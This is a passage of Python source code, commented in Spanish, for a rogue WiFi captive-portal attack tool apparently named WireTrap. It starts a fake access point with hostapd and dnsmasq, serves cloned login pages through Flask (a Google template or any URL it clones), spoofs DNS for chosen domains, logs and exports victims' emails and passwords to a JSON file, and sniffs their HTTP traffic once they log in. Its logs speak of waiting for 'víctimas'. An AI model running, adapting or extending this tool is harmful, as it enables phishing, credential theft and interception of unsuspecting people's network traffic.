                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                out = self._dnsmasq_proc.stdout.read().decode(errors="ignore")
                self._err("dnsmasq terminó prematuramente:\n" + out)
                return False
            self._log("dnsmasq arrancado (PID " + str(self._dnsmasq_proc.pid) + ")")
            return True
        except FileNotFoundError:
            self._err("dnsmasq no encontrado: sudo apt install dnsmasq")
            return False
        except Exception as e:
            self._err("Error dnsmasq: " + str(e))
            return False

    def _start_flask(self):
        try:
            from flask import Flask  # noqa
        except ImportError:
            self._err("Flask no encontrado: sudo apt install python3-flask")
            return False

        app = _build_flask_app(
            gateway_ip=GATEWAY_IP,
            template_type=self.template_type,
            creds_log=self.captured_creds,
            custom_html=self.custom_html if self.template_type == "custom" else None,
            on_credential=self._on_new_credential,
            on_client_login=self._on_client_login,
            dns_spoof_domains=self.dns_spoof_domains if self.dns_spoof_domains else None
        )
        if not app:
            self._err("No se pudo construir la app Flask.")
            return False

        def run_flask():
            try:
                import logging as _lg
                _lg.getLogger("werkzeug").setLevel(_lg.ERROR)
                app.run(host="0.0.0.0", port=FLASK_PORT,
                        threaded=True, use_reloader=False, debug=False)
            except Exception as ex:
                self._err("Flask error: " + str(ex))

        self._flask_thread = threading.Thread(target=run_flask, daemon=True)
        self._flask_thread.start()
        self._log("Flask portal en http://0.0.0.0:" + str(FLASK_PORT))
        return True

    def _start_sniffer(self):
        try:
            from post_exploitation.sniffer import WireTrapSniffer
        except ImportError:
            self._log("[!] Sniffer no disponible (instala python3-scapy)")
            return

        self._sniffer = WireTrapSniffer(self.interface)

        def _fwd(data):
            self._log("[SNIFF] " + data.data_type + " | " + data.source_ip + " | " + data.value[:80])
            if self.on_sniff_data:
                self.on_sniff_data(data)

        self._sniffer.on_data = _fwd
        self._sniffer.start()
        self._log("Sniffer HTTP activo en " + self.interface)

    def _on_new_credential(self, entry):
        self._log("[!!!] CREDENCIAL  IP=" + entry["ip"] +
                  "  email=" + entry["email"] + "  pass=" + entry["password"])
        if self.on_credential:
            self.on_credential(entry)

    def _on_client_login(self, client_ip):
        if client_ip in self._logged_in_ips:
            return
        self._logged_in_ips.add(client_ip)
        self._log("[*] Login desde " + client_ip + " — activando internet + sniffer")

        def _activate():
            self._grant_internet(client_ip)
            if self._sniffer is None:
                self._start_sniffer()

        threading.Thread(target=_activate, daemon=True).start()

    def _clone_spoof_pages(self):
        """
        Para cada entrada en dns_spoof_domains que tenga clone_url,
        clona la página y guarda el HTML en entry["html"].
        Se llama justo antes de arrancar Flask.
        """
        if not self.dns_spoof_domains:
            return
        for entry in self.dns_spoof_domains:
            if not isinstance(entry, dict):
                continue
            clone_url = entry.get("clone_url", "").strip()
            if not clone_url:
                continue
            self._log("[DNS Spoof] Clonando " + clone_url + " para dominio " + entry["domain"])
            html = clone_login_page(clone_url, log_fn=self._log)
            if html:
                entry["html"] = html
                self._log("[DNS Spoof] ✓ Clonado OK (" + str(len(html)) + " bytes) → " + entry["domain"])
            else:
                self._log("[DNS Spoof] ✗ Fallo al clonar " + clone_url + " — se usará el portal por defecto")

    def start(self, ssid="FreeWiFi", channel=6,
              template="google", out_interface="eth0"):
        if self.running:
            self._log("Ya está en ejecucion.")
            return

        self.ssid          = ssid
        self.channel       = max(1, min(13, int(channel)))
        self.template_type = template
        self.out_interface = out_interface
        self.captured_creds.clear()
        self._logged_in_ips.clear()
        self._sniffer = None

        self._log("=== Iniciando Captive Portal ===")
        self._log("  SSID      : " + self.ssid)
        self._log("  Canal     : " + str(self.channel))
        self._log("  Plantilla : " + self.template_type)
        self._log("  Internet  : " + self.out_interface)

        if template == "custom" and not self.custom_html:
            self._err("Plantilla personalizada seleccionada pero no se ha clonado ninguna URL. "
                      "Usa 'Clonar Plantilla' antes de iniciar.")
            return

        self._write_hostapd_conf()
        self._write_dnsmasq_conf()
        self._configure_interface()

        if not self._start_hostapd():
            self._cleanup(); return
        if not self._start_dnsmasq():
            self._cleanup(); return

        self._setup_iptables_portal()

        # Clonar páginas para DNS Spoofing antes de arrancar Flask
        self._clone_spoof_pages()

        if not self._start_flask():
            self._cleanup(); return

        self.running = True
        self._log("=== Portal Cautivo ACTIVO — Esperando víctimas ===")
        if self.on_started:
            self.on_started()

    def stop(self):
        if not self.running and not self._hostapd_proc and not self._dnsmasq_proc:
            return

        self.running = False
        self._log("Deteniendo Captive Portal...")

        if self._sniffer:
            try: self._sniffer.stop()
            except Exception: pass
            self._sniffer = None

        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=3)
            except Exception:
                try: self._hostapd_proc.kill()
                except Exception: pass
            self._hostapd_proc = None

        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=3)
            except Exception:
                try: self._dnsmasq_proc.kill()
                except Exception: pass
            self._dnsmasq_proc = None

        self._clear_iptables()
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)

        for f in [self._hostapd_conf, self._dnsmasq_conf]:
            try: os.remove(f)
            except FileNotFoundError: pass

        self._log("Captive Portal detenido.")
        if self.on_stopped:
            self.on_stopped()

    def _cleanup(self):
        self.stop()

    def export_credentials(self, path=None):
        if not path:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = "/tmp/wiretrap_creds_" + ts + ".json"
        with open(path, "w") as f:
            json.dump(self.captured_creds, f, indent=2, ensure_ascii=False)
        self._log("Credenciales exportadas → " + path)
        return path


# ── Test de terminal ─────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: sudo python3 captive_portal.py <iface_ap> <iface_internet> [ssid] [url_a_clonar]")
        print("Ejemplo: sudo python3 captive_portal.py wlan0 eth0 MallWiFi_FREE")
        print("         sudo python3 captive_portal.py wlan0 eth0 McDoWiFi https://example.com/login")
        sys.exit(1)

    iface  = sys.argv[1]
    out_if = sys.argv[2]
    ssid   = sys.argv[3] if len(sys.argv) > 3 else "MallWiFi_FREE"
    clone_url = sys.argv[4] if len(sys.argv) > 4 else None

    cp = CaptivePortal(iface)
    cp.on_log        = lambda m: print("[LOG] " + m)
    cp.on_error      = lambda m: print("[ERR] " + m)
    cp.on_credential = lambda e: print("\n[!!!] CAPTURADO: " + str(e) + "\n")
    cp.on_sniff_data = lambda d: print("[SNIFF] " + d.data_type + " " + d.source_ip + " " + d.value[:60])

    if clone_url:
        if not cp.clone_template(clone_url):
            sys.exit(1)
        cp.start(ssid=ssid, channel=6, template="custom", out_interface=out_if)
    else:
        cp.start(ssid=ssid, channel=6, template="google", out_interface=out_if)

    try:
        while cp.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Deteniendo...")
        cp.stop()
